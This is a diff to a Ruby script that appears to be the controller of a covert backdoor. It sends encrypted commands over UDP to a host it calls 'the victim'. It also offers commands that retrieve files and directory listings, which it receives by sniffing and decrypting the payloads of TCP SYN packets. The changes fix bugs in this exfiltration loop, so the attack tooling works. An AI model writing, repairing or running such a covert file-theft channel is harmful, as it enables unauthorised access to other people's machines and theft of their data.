@@ -35,12 +35,10 @@ end
 # Make sure that we are running as root
 raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 
-# Create UDP Socket for Commands
-udp = UDPPacket.new
-# Create Dispatcher for encrypting and decrypting
-dis = Dispatch.new
 # Get machine info (ie. ethernet address, ip address, etc.)
 cfg = Utils.whoami?(:iface => opts[:dev])
+# Create Dispatcher for encrypting and decrypting
+dis = Dispatch.new
 
 #-------------------------------------------------------------------------------
 # Prompts
@@ -60,6 +58,9 @@ while 1 do
 		print "\tget [filename] <port>: Gets a specified file from the victim\n"
 		print "\tls [directory]: Gets a listing of the files and directorie of a specific directory\n"
 	elsif cmds[0] == "get" then # Get file
+	    # Create UDP Socket for Commands
+        udp = UDPPacket.new
+        # Encrypt command
 		hash = dis.encrypt(cmd)
         
         #--------------------------------
@@ -92,8 +93,7 @@ while 1 do
 
 		#--------------------------------
 	    # Sniff for reply
-		filter = "tcp and src host " + opts[:host] + " and dst port " + opts[:rport].to_s
-
+		filter = "tcp and src host " + opts[:host] + " and dst port " + cmds[3].to_s
 		cap = Capture.new(:iface => opts[:dev], :start => true, :filter => filter)
 
 		# Capture packets
@@ -101,19 +101,21 @@ while 1 do
 			packet = Packet.parse pkt
 			
 			# Check if fin flag is set
-			if packe.tcp_flags.fin == 1 then
+			if packet.tcp_flags.fin == 1 then
 			    break
+			elsif packet.tcp_flags.syn == 1 then
+			    # Decrypt and write response to file
+			    response = dis.decrypt packet.payload
+			    file.write(response)
 			end
-			
-			# Decrypt and write response to file
-			repsonse = dis.decrypt packet.payload
-			p response
-			file.write(response)
 		end
 		file.close
 		
 		print "Data transfer complete!\n"
 	else # Normal commands
+	    # Create UDP Socket for Commands
+        udp = UDPPacket.new
+        # Encrypt command
 		hash = dis.encrypt(cmd)
         
         #--------------------------------
